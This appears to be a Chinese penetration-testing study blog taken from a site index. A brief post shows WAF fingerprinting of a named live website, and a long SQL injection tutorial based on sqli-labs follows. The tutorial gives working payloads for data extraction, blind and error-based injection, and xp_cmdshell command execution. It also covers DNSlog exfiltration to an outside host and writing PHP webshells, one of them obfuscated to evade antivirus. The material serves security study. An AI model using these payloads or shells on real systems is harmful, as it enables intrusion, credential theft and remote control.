识别网站https://www.hlszsb.com/[*] Checking https://www.hlszsb.com/[+] Generic Detection results:[-] No WAF detected by the generic detection[~] Number of requests: 7 identYwaf 参考地址：https://github.com/stamparm/identywaf 与wafwoof相比运行速度慢，但是比较稳定 在有些网站的请求信息当中留下了waf的相关信息 nmap 12nmap --script==http-waf-fingerprintnmap --script=http-waf-detect 7. 资产收集1234567891011121314151617# Github监控 便于收集整理最新exp或poc 便于发现相关测试目标的资产 server酱：http://sc.ftqq.com/3.version GitHub项目监控地址：https://github.com/weixiao9188/wechat_push# 各种子域名查询# DNS,备案,证书# 全球节点请求cdn 枚举爆破或解析子域名对应 便于发现管理员相关的注册信息#黑暗引擎相关搜索 fofa, shodan, zoomeye #微信公众号接口获取# 内部群内部资源 8. web漏洞 漏洞危害情况 获取网站的数据库的权限（数据），后台账号和密码—SQL注入 直接获取网站权限—文件上传 漏洞等级划分 高危：文件上传、SQL注入、代码执行、文件包含、未授权访问 中危：逻辑安全、目录遍历 低危：信息泄露—源码、部分账号密码 漏洞重点内容 CTF：SQL注入、反序列化、代码执行 SRC：以上都有，逻辑安全 红蓝对抗：高危漏洞—权限","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"SQL注入","slug":"渗透测试/2. SQL注入","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T11:58:37.395Z","comments":true,"path":"posts/[object Object]/渗透测试/2. SQL注入/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5/undefined","excerpt":"","text":"SQL注入 1. 概念SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。 sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。 如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。 2. 产生过程大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。 如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。 3. 常见原因①转义字符处理不合适； ②不安全的数据库配置； ③不合理的查询集处理； ④不当的错误处理； ⑤多个提交处理不当。 不当的处理类型sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 不安全的数据库配置数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。 SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。 攻击者利用sql注入漏洞时，通常会尝试访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases和show tables命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。 不合理的查询集处理有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。 不当的错误处理（盲注）错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 多个提交处理不当大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 4. 危害盗取网站的数据库敏感信息 绕过网站后台认证（万能密码：‘ or ‘1’=‘1’ # 登录绕过） 借助SQL注入漏洞提权获取系统权限 上传或读取文件 执行系统命令 5. MySQL注入流程 以sqli-labs为例：https://github.com/Audi-1/sqli-labs 查看源码，分析注入原理： 12345678910111213if(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;直接传递的变量$id带入sql语句中执行没有做任何的限制。 判断注入点以及注入类型在给id赋值时加上其他无意义的字符id=1abc或者id=1 and 1=1、id=1 and 1=2，或者更换闭合条件为单引号1&#39; and 1=1#、 1&#39; and 1=2#之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1&#x3D;1）或者回显为空（解析了and 1&#x3D;2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。 闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。 123SELECT * FROM users WHERE id=1 LIMIT 0,1 SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 # 页面回显，正常输出SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1 # 页面回显，提示错误 信息收集（高版本数据库）必要知识点: 在MYSQL5.0以上版本中，mysql存在一个自带数据库，名为information_ schema，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号”.”代表下一级，比如xiao.user代表数据库xiao中的表user。因此： information_ schema.tables：记录所有表名信息的表 information_ schema.columns：记录所有列名信息的表 table_schema：数据库名 tables_name：表名 column_name：列名 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。 猜解数据库列数（字段数）使用order by判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。 1192.168.102.130:8888/Less-2/index.php?id=1 order by 5 以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。 判断前端回显判断select的哪几个位置会被前端回显，后续查询就在该位置进行。其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。 1192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3 结果显示2，3的位置会被前端回显。 查询数据库版本1?id=-1 union select version() 查询数据库名称1?id=-1 union select database() 查询数据库用户若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。 1?id=-1 union select user() 查询操作系统1?id=-1 union select @@version_compile_os 比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统： 1192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4 以及数据库名称和版本名称： 1?id=-1 union select 1,database(),version(),4 查询指定数据库下的表名信息根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助information_ schema.tables查询该数据库的所有表名： 1http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() 得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。 查询指定表名下的列名根据刚才收集的表名StormGroup_member，查询该表的所有列名： 1?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= &#x27;StormGroup_member&#x27; 查询指定数据根据刚才收集的表名、列名，可以查询该表的指定数据： 1?id=-1 union select 1,name,password,4 from StormGroup_member 指定数据可能有多个结果，可以使用limit x,1（从x的位置读取1条记录），变动猜解，得到不同结果： 1http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1 得到的密码一般为MD5，去cmd5.com碰撞一下。 跨库查询MYSQL 注入中首先要明确当前注入点权限（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。 imformation_schema除了记录有所有的表名、列名，还有所有的数据库名： imformation_schema.schemata：记录所有数据库名信息的表（跨库），其中字段schema_name表示数据库名。 查询的前提是用户具有相应的权限。 查询所有的数据库名1?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata 查询指定数据库下的表名信息1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;qqyw&#x27; 查询指定表名下的列名信息1id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27; limit 0,1 # 当出现多个记录时，可以使用limit 0,1取第一个记录 查询指定数据1union select 1,u,p,4 from qqyw.admin # 查询u,p两列的数据，注意指定admin来自qqyw 信息收集（低版本数据库）暴力查询或结合读取查询 SQLmap工具——字典dicts.py load_file读取源代码的数据库查询语句 暴力猜解——admin，password，passwd，user，member &#x3D;&#x3D;文件读写操作&#x3D;&#x3D; **load_file()**：读取函数，读取文件内容 常见的load_file()读取的敏感信息路径：https://blog.csdn.net/weixin_30292843/article/details/99381669 12id=-1 union select 1,loadfile(&#x27;d:/www.txt&#x27;),3id=-1 union select 1,load_file(&#x27;C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;),3 into outfile 或 into dumpfile ：上传文件（写入后门、木马） 1union select 1,&#x27;x&#x27;,3 into outfile &#x27;C:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\x.php&#x27;--+ 其中–+用于注释后面的语句，后面有limit 0,1。 文件路径获取文件的读写都需要获取到文件路径，路径获取常见方法包括： 报错显示：网站报错时，显示的一些路径信息。 遗留文件：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。 报错信息的漏洞： 平台配置文件（不实用）： 比如在phpStudy中，配置文件C:\\phpstudy\\PHPTutorial\\Apache\\conf\\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。 爆破： PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破： 读写问题：魔术引号开关 概念 魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个反斜线进行转义，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。 在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。 其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。 影响 如果开启魔术引号，则上传语句 1id=-1 union select 1,load_file(&#x27;D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql&#x27;),3 会被转义成如下内容，使SQL注入命令失效： 1id=-1 union select 1,load_file(\\&#x27;D:\\\\\\\\phpstudy\\\\\\\\PHPTutorial\\\\\\\\WWW\\\\\\\\sqli-labs-master\\\\\\\\sql-lab.sql\\&#x27;),3 绕过 可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过。 绕过原理：sql可以识别并执行用hex表示的语句 利用SQL注入执行命令https://www.cnblogs.com/feiquan/p/8673093.html 借助 xp_cmdshell 运行cmd命令。 123456789101112131415USE masterGORECONFIGURE --先执行一次刷新，处理上次的配置GOEXEC sp_configure &#x27;show advanced options&#x27;,1 --启用xp_cmdshell的高级配置GORECONFIGURE --刷新配置GOEXEC sp_configure &#x27;xp_cmdshell&#x27;,1 --打开xp_cmdshell,可以调用SQL系统之外的命令GORECONFIGUREGO--使用xp_cmdshell在D盘创建一个myfile 文件夹EXEC xp_cmdshell &#x27;mkdir d:\\myfile&#x27;,no_output --[no_output]表示是否输出信息GO SQLserver执行系统命令的几种方式：https://www.cnblogs.com/Azjj/p/14019312.html xp_cmdshell SP_OACREATE 通过沙盒执行命令 &#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;https://blog.csdn.net/huangyongkang666/article/details/123728115 上传webshell文件上传文件的条件： 网站物理路径； 文件写入的权限； secure_file_priv 不为 NULL； secure_file_priv&#x3D;NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv&#x3D;&#x2F;mysql&#x2F;时，则导入导出必须要在该文件目录下完成。 12345?id=1 union select &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile &#x27;D:/WWW/evil.php&#x27;?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;D:/WWW/evil.php&#x27;?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;D:/WWW/evil.php&quot; 利用分隔符写入12345?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; fields terminated by &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+?id=1 LIMIT 0,1 INTO OUTFILE &#x27;D:/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+ 1234567?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by （一句话hex编码）#?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by （一句话hex编码）# 利用日志写入新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。 利用条件： 对web目录有写权限 GPC关闭(GPC:是否对单引号转义) 有绝对路径(读文件可以不用，写文件需要) 需要能执行多行SQL语句 123456789show variables like &#x27;%general%&#x27;; # 查看配置set global general_log = on; # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。set global general_log_file = &#x27;D:/WWW/evil.php&#x27;; # 设置日志目录为shell地址select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27; # 写入shellset global general_log=off; # 关闭general log模式 在高版本的mysql中默认为NULL，就是不让导入和导出 解决办法： 在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv 在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv 使用慢查询日志绕过此限制 123456789show variables like &#x27;%slow_query_log%&#x27;; #查看慢查询日志开启情况set global slow_query_log=1 #开启慢查询日志set global slow_query_log_file=&#x27;D:/phpStudy/WWW/evil.php; #修改日志文件存储的绝对路径&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11); #写入shellshow global variables like &#x27;%long_query_time%&#x27;; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间 免杀shell： 1SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot; 6. SQL注入进阶&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;https://www.cnblogs.com/backlion/p/9721687.html stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加;表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。 比如： 1mysql&gt; select * from users; select * from emails; 将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。 id=1&#39;;insert into users(id,username,password) values ( 39, &#39;less38 &#39;, &#39;hello &#39;)--+ 当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。 id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;, sleep(3), 1)--+ 加解密编码注入某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码： 12345678910GET /Less-21/index.php HTTP/1.1Host: 10.1.1.133User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://10.1.1.133/Less-21/index.phpConnection: closeCookie: uname=YWRtaW4%3DUpgrade-Insecure-Requests: 1 YWRtaW4%3D是一个base64加密的字符串，其中%3D是编码中的=符号，把他发送到编码模块当中解密，得到明文admin。 所以构造好注入语句后，也需要进行编码，也就是说admin&#39; and 1=1加密之后的值是YWRtaW4nIGFuZCAxPTE=。 而获取数据库名称的报错盲注的语句admin&#39; or updatexml(1,concat(0x7e,(database())),0) or &#39;加密后cookie值Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo= 二次注入（绕过转义）（sqlilabs less 24） 二次注入原理，主要分为两步 第一步：插入恶意数据 第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。 第二步：引用恶意数据 在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。 在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用。 举例： 比如已经通过代码审计知道，网页有注册和查询&#x2F;更改密码的功能，并且： 注册页面会在后台执行insert语句insert into user(id,username,pwd) values(2,’x’,’123’) 更改密码，则包含update语句upadte user set pwd=’123456’ where id=2 and username=’admin’。 在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用admin&#39; and 1=1#作为用户名进行注册。 那么在更新密码页面，就会执行： 1upadte user set pwd=’123’ where id=2 and username=&#x27;admin&#x27; and 1=1#&#x27; 同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。 比如使用dhakkan&#39;#作为用户名注册，那么更新密码时就会执行： upadte user set pwd=’sss’ where username=&#39;dhakkan&#39;#&#39; 被更新密码的账户从dhakkan&#39;#变成了dhakkan。 以此类推，可以借助用户名来爆数据库信息： 若输入用户名：&#39; or updatexml(1,concat(0x7e,version()),0) or’ 和密码：123 那么更新密码的SQL就是： 1`update users set pwd=&#x27;sss&#x27; where username=&#x27;&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;&#x27; and password=&#x27;123456&#x27; 但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。 load_file&amp;DNSlog注入（解决无回显）sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例） dnslog解决了盲注不能回显数据，效率低的问题 原理：load_file支持对外的文件读取，通过在URL中加入SQL语句，可以借助读取DNS访问记录得到SQL语句的执行结果。 比如构造如下语句： 1?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select version()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+ 工具：http://ceye.io，注册后可以获得个人的DNS地址： 成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。 或者查看数据库名称： 1?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select database()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+ 参考资料：https://www.cnblogs.com/xhds/p/12322839.html 使用DnsLog盲注仅限于windos环境。 使用工具DnslogSqlinj https://github.com/ADOOO/DnslogSqlinj 获取数据库名称： 宽字节注入（绕过转义）当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。 不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了id=1%df&#39;，经过转义就是id=1%df%5c&#39;。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字”連”，所以这时，单引号成功被读入。 所以可以构造攻击语句：id=1%df&#39; and 1=1%23进行注入点的判断。 XFF注入XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。 通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。 如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。 比如构造攻击语句：X Forwarded -for=127.0.0.1&#39; union select 1,2,3,4# 7. SQL注入类型按照注入方式普通注入和盲注普通注入就是注入的页面是直接显示数据库中的字段内容的，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。 盲注则要困难很多，页面不直接显示数据库字段内容，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。 其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。 select 查询数据 例：select * from news where id=$id 应用：查询用户 insert 插入数据 例：insert into users(id,username,password) values(30,&#39;x&#39;,&#39;123&#39;) 应用：网站的用户注册 和select操作的数据包相似，但是不能像普通select注入一样操作。 delete 删除数据 例：delete from users where id=30 应用：后台管理里面删除用户等操作、删除留言等 update 更新数据 例：update users set password=&#39;123&#39; where id=11 and username=&#39;admin3&#39; 应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等 order by 排序数据 一般结合表名或列名进行数据排序操作 例：select * from news order by $id 例：select id,name,price from news order by $order 基于报错的SQL盲注（优先）12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c floor、extractvalue、updatexml报错原理：https://developer.aliyun.com/article/692723 floor向下取整数 0x7e为~ rand() 产生[0,1)的随机小数； group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。 利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 rand()和group by同时使用 的时候，可能会产生超出预期的结果，因为会多次对同一列进行查询。 12345678910111213141516171819202122232425262728//select// 爆数据库版本1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#// 通过修改limit后面数字一个一个爆表1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#// 爆出所有表1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#// 爆出所有字段名1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#// 爆出所有字段名1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#//爆出该账户的密码。1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)# //insertusername=x&#x27; or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;//updateadd=hubeNicky&#x27; or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;// deleteid=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)// 由于是在数据包中编辑，所以用+代替空格，避免歧义 报错结果如下，显示出了数据库名称： extractvalue(xml_frag, xpath_expr) xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。 利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。 ![1551928141656](https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07 报错注入：extractvalue、updatexml&#x2F;1551928141656.png?x-oss-process&#x3D;style&#x2F;shuiyin) 12345678// insertusername=x&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;// updateadd=hubeNicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;// delete?id=56+or+extractvalue(1,concat(0x7e,database())) 其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出 UpdateXML(xml_document, xpath_expr, new_xml) xml_document：String格式，为XML文档对象的名称 xpath_expr：Xpath格式的字符串 new_xml：String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值 此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。 如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。 和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容： 12345678// insertusername=x&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;// updateadd=hubeNicky&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;// delete?id=56+or+updatexml+(1,concat(0x7e,database()),0) 基于布尔的SQL盲注（其次）逻辑判断，regexp正则表达式，like，ascii，left，ord返回字符串第一个字符的ascii码，mid取字符串子串。 布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。 猜解数据库长度 1&#x27; or length(database()) &gt; 8 --+ # 符合条件返回正确，反之返回错误 猜解数据库名 12&#x27;or mid(database(),1,1)=&#x27;z&#x27; --+&#x27;or ORD(mid(database(),1,1)) &gt; 100 --+ : # 因为需要验证的字符太多，所以可以转化为ascii码验证 猜解表的总数 1&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2 --+ # 判断表的总数 猜解各个表名的长度 12&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表） 猜解第一个表名 123&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = &#x27;a&#x27; --+或者&#x27;rr ord(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100 --+ 猜解表的字段的总数 12&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 0,1) = 10 --+&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = 10 --+ （第二个字段） 猜解第一个字段名 12345&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1) = &#x27;i&#x27; --+或者&#x27;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 